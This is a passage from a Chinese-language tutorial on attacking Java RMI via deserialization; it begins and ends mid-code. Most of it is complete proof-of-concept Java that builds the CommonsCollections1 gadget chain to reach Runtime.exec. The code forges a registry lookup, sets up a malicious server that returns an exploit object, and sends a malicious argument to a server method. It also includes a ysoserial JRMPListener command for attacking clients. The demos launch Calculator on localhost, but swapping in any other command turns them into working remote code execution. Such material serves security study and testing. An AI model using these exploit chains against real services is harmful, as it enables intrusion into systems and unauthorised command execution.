                throw var19;
            } catch (RemoteException var20) {
                throw var20;
            } catch (NotBoundException var21) {
                throw var21;
            } catch (Exception var22) {
                throw new UnexpectedException("undeclared checked exception", var22);
            }
        }
POC如下：
    import org.apache.commons.collections.Transformer;
    import org.apache.commons.collections.functors.ChainedTransformer;
    import org.apache.commons.collections.functors.ConstantTransformer;
    import org.apache.commons.collections.functors.InvokerTransformer;
    import sun.rmi.server.UnicastRef;
    import java.io.ObjectOutput;
    import java.lang.reflect.Constructor;
    import java.lang.reflect.Field;
    import java.lang.reflect.InvocationHandler;
    import java.lang.reflect.Proxy;
    import java.rmi.Remote;
    import java.rmi.registry.LocateRegistry;
    import java.rmi.registry.Registry;
    import java.rmi.server.Operation;
    import java.rmi.server.RemoteCall;
    import java.rmi.server.RemoteObject;
    import java.util.HashMap;
    import java.util.Map;
    public class Client {
        public static void main(String[] args) throws Exception {
            ChainedTransformer chain = new ChainedTransformer(new Transformer[] {
                    new ConstantTransformer(Runtime.class),
                    new InvokerTransformer("getMethod", new Class[] {
                            String.class, Class[].class }, new Object[] {
                            "getRuntime", new Class[0] }),
                    new InvokerTransformer("invoke", new Class[] {
                            Object.class, Object[].class }, new Object[] {
                            null, new Object[0] }),
                    new InvokerTransformer("exec",
                            new Class[] { String.class }, new Object[]{"open  /System/Applications/Calculator.app"})});
            HashMap innermap = new HashMap();
            Class clazz = Class.forName("org.apache.commons.collections.map.LazyMap");
            Constructor[] constructors = clazz.getDeclaredConstructors();
            Constructor constructor = constructors[0];
            constructor.setAccessible(true);
            Map map = (Map)constructor.newInstance(innermap,chain);
            Constructor handler_constructor = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").getDeclaredConstructor(Class.class,Map.class);
            handler_constructor.setAccessible(true);
            InvocationHandler map_handler = (InvocationHandler) handler_constructor.newInstance(Override.class,map); //创建第一个代理的handler
            Map proxy_map = (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),new Class[]{Map.class},map_handler); //创建proxy对象
            Constructor AnnotationInvocationHandler_Constructor = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").getDeclaredConstructor(Class.class,Map.class);
            AnnotationInvocationHandler_Constructor.setAccessible(true);
            InvocationHandler handler = (InvocationHandler)AnnotationInvocationHandler_Constructor.newInstance(Override.class,proxy_map);
            Registry registry = LocateRegistry.getRegistry("127.0.0.1",1099);
            Remote r = Remote.class.cast(Proxy.newProxyInstance(
                    Remote.class.getClassLoader(),
                    new Class[] { Remote.class }, handler));
            // 获取ref
            Field[] fields_0 = registry.getClass().getSuperclass().getSuperclass().getDeclaredFields();
            fields_0[0].setAccessible(true);
            UnicastRef ref = (UnicastRef) fields_0[0].get(registry);
            //获取operations
            Field[] fields_1 = registry.getClass().getDeclaredFields();
            fields_1[0].setAccessible(true);
            Operation[] operations = (Operation[]) fields_1[0].get(registry);
            // 伪造lookup的代码，去伪造传输信息
            RemoteCall var2 = ref.newCall((RemoteObject) registry, operations, 2, 4905912898345647071L);
            ObjectOutput var3 = var2.getOutputStream();
            var3.writeObject(r);
            ref.invoke(var2);
        }
    }
## 攻击客户端
### 注册中心攻击客户端
此方法可以攻击客户端和服务端
对于注册中心来说，我们还是从这几个方法触发：
  * bind
  * unbind
  * rebind
  * list
  * lookup
除了unbind和rebind都会返回数据给客户端，返回的数据是序列化形式，那么到了客户端就会进行反序列化，如果我们能控制注册中心的返回数据，那么就能实现对客户端的攻击，这里使用ysoserial的JRMPListener，命令如下
    java -cp ysoserial-master-30099844c6-1.jar ysoserial.exploit.JRMPListener 12345  CommonsCollections1 'open  /System/Applications/Calculator.app'
然后使用客户端去访问
    import java.rmi.registry.LocateRegistry;
    import java.rmi.registry.Registry;
    public class Client {
        public static void main(String[] args) throws Exception {
            Registry registry = LocateRegistry.getRegistry("127.0.0.1",12345);
            registry.list();
        }
    }
就成功实现客户端的RCE
这里即使调用unbind也会触发反序列化，推测是在之前传输一些约定好的数据时进行的序列化和反序列化。所以实际上这五种方法都可以达到注册中心反打客户端或服务端的目的
### 服务端攻击客户端
服务端攻击客户端，大抵可以分为以下两种情景。
1.服务端返回参数为Object对象  
2.远程加载对象
在RMI中，远程调用方法传递回来的不一定是一个基础数据类型（String、int），也有可能是对象，当服务端返回给客户端一个对象时，客户端就要对应的进行反序列化。所以我们需要伪造一个服务端，当客户端调用某个远程方法时，返回的参数是我们构造好的恶意对象。这里以cc1为例
恶意类LocalUser
    import org.apache.commons.collections.Transformer;
    import org.apache.commons.collections.functors.ChainedTransformer;
    import org.apache.commons.collections.functors.ConstantTransformer;
    import org.apache.commons.collections.functors.InvokerTransformer;
    import java.io.Serializable;
    import java.lang.reflect.Constructor;
    import java.lang.reflect.InvocationHandler;
    import java.lang.reflect.Proxy;
    import java.rmi.RemoteException;
    import java.rmi.server.UnicastRemoteObject;
    import java.util.HashMap;
    import java.util.Map;
    public class LocalUser extends UnicastRemoteObject implements User  {
        public String name;
        public int age;
        public LocalUser(String name, int age) throws RemoteException {
            super();
            this.name = name;
            this.age = age;
        }
        public Object getUser(){
            InvocationHandler handler = null;
            try {
                ChainedTransformer chain = new ChainedTransformer(new Transformer[]{
                        new ConstantTransformer(Runtime.class),
                        new InvokerTransformer("getMethod", new Class[]{
                                String.class, Class[].class}, new Object[]{
                                "getRuntime", new Class[0]}),
                        new InvokerTransformer("invoke", new Class[]{
                                Object.class, Object[].class}, new Object[]{
                                null, new Object[0]}),
                        new InvokerTransformer("exec",
                                new Class[]{String.class}, new Object[]{"open  /System/Applications/Calculator.app"})});
                HashMap innermap = new HashMap();
                Class clazz = Class.forName("org.apache.commons.collections.map.LazyMap");
                Constructor[] constructors = clazz.getDeclaredConstructors();
                Constructor constructor = constructors[0];
                constructor.setAccessible(true);
                Map map = (Map) constructor.newInstance(innermap, chain);
                Constructor handler_constructor = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").getDeclaredConstructor(Class.class, Map.class);
                handler_constructor.setAccessible(true);
                InvocationHandler map_handler = (InvocationHandler) handler_constructor.newInstance(Override.class, map); //创建第一个代理的handler
                Map proxy_map = (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]{Map.class}, map_handler); //创建proxy对象
                Constructor AnnotationInvocationHandler_Constructor = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").getDeclaredConstructor(Class.class, Map.class);
                AnnotationInvocationHandler_Constructor.setAccessible(true);
                handler = (InvocationHandler) AnnotationInvocationHandler_Constructor.newInstance(Override.class, proxy_map);
            }catch(Exception e){
                e.printStackTrace();
            }
            return (Object)handler;
        }
    }
User接口
    import java.rmi.RemoteException;
    public interface User extends java.rmi.Remote {
        public Object getUser() throws RemoteException;
    }
服务端
    import java.rmi.AlreadyBoundException;
    import java.rmi.NotBoundException;
    import java.rmi.RemoteException;
    import java.rmi.registry.LocateRegistry;
    import java.rmi.registry.Registry;
    import java.util.concurrent.CountDownLatch;
    public class Server {
        public static void main(String[] args) throws RemoteException, AlreadyBoundException, InterruptedException, NotBoundException {
            User liming = new LocalUser("liming",15);
            Registry registry = LocateRegistry.createRegistry(1099);
            registry.bind("user",liming);
            System.out.println("registry is running...");
            System.out.println("liming is bind in registry");
            CountDownLatch latch=new CountDownLatch(1);
            latch.await();
        }
    }
客户端
    import java.rmi.registry.LocateRegistry;
    import java.rmi.registry.Registry;
    public class Client {
        public static void main(String[] args) throws Exception {
            Registry registry = LocateRegistry.getRegistry("127.0.0.1",1099);
            User user = (User) registry.lookup("user");
            user.getUser();
        }
    }
当客户端调用服务端绑定的远程对象的getUser方法时，将反序列化服务端传来的恶意远程对象。此时将触发RCE
### 加载远程对象
这个条件十分十分苛刻，在现实生活中基本不可能碰到。
当服务端的某个方法返回的对象是客户端没有的时，客户端可以指定一个URL，此时会通过URL来实例化对象。
具体可以参考这篇文章，利用条件太过于苛刻了：
`java.security.policy`这个默认是没有配置的，需要我们手动去配置
## 攻击服务端
上面说了利用注册中心攻击客户端，同样的方法也可以攻击服务端，这里说一下客户端攻击服务端的方式
### 当服务端的远程方法存在Object参数的情况下
如果服务端的某个方法，传递的参数是Object类型的参数，当服务端接收数据时，就会调用readObject，所以我们可以从这个角度入手来攻击服务端。
我们写一个addUser方法，是接收Object类型参数的
    import java.rmi.RemoteException;
    public interface User extends java.rmi.Remote {
        public Object getUser() throws RemoteException;
        public void addUser(Object user) throws RemoteException;
    }
当客户端调用这个方法时候，服务端会对其传递的参数进行反序列化。
Client Demo:
    import org.apache.commons.collections.Transformer;
    import org.apache.commons.collections.functors.ChainedTransformer;
    import org.apache.commons.collections.functors.ConstantTransformer;
    import org.apache.commons.collections.functors.InvokerTransformer;
    import java.lang.reflect.Constructor;
    import java.lang.reflect.InvocationHandler;
    import java.lang.reflect.Proxy;
    import java.rmi.Remote;
    import java.rmi.registry.LocateRegistry;
    import java.rmi.registry.Registry;
    import java.util.HashMap;
    import java.util.Map;
    public class Client {
        public static void main(String[] args) throws Exception {
            ChainedTransformer chain = new ChainedTransformer(new Transformer[] {
                    new ConstantTransformer(Runtime.class),
                    new InvokerTransformer("getMethod", new Class[] {
                            String.class, Class[].class }, new Object[] {
                            "getRuntime", new Class[0] }),
                    new InvokerTransformer("invoke", new Class[] {
                            Object.class, Object[].class }, new Object[] {
                            null, new Object[0] }),
                    new InvokerTransformer("exec",
                            new Class[] { String.class }, new Object[]{"open  /System/Applications/Calculator.app"})});
            HashMap innermap = new HashMap();
            Class clazz = Class.forName("org.apache.commons.collections.map.LazyMap");
            Constructor[] constructors = clazz.getDeclaredConstructors();
            Constructor constructor = constructors[0];
            constructor.setAccessible(true);
            Map map = (Map)constructor.newInstance(innermap,chain);
            Constructor handler_constructor = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").getDeclaredConstructor(Class.class,Map.class);
            handler_constructor.setAccessible(true);
            InvocationHandler map_handler = (InvocationHandler) handler_constructor.newInstance(Override.class,map); //创建第一个代理的handler
            Map proxy_map = (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),new Class[]{Map.class},map_handler); //创建proxy对象
            Constructor AnnotationInvocationHandler_Constructor = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").getDeclaredConstructor(Class.class,Map.class);
            AnnotationInvocationHandler_Constructor.setAccessible(true);